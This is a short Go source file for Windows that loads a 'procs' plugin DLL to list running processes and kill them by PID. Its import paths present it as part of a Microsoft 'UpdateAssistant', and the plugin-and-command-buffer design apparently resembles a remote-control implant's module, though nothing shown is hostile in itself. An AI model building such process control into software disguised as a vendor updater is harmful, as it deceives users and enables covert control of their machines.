//go:build windows

package sysutil

import (
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
)

func procsDLL(fn func(*loader.Plugin)) {
	p, err := loader.Load("procs")
	if err != nil {
		return
	}
	defer loader.Unload(p)
	fn(p)
}

func ListProcs() string {
	var r string
	procsDLL(func(p *loader.Plugin) {
		buf := make([]byte, config.CmdBuf)
		n, err := p.Call("list_procs",
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(config.CmdBuf),
		)
		if err == nil {
			r = string(buf[:int(n)])
		}
	})
	return r
}

func KillProc(pid uint32) bool {
	var ok bool
	procsDLL(func(p *loader.Plugin) {
		n, _ := p.Call("kill_proc", uintptr(pid))
		ok = int(n) == 1
	})
	return ok
}
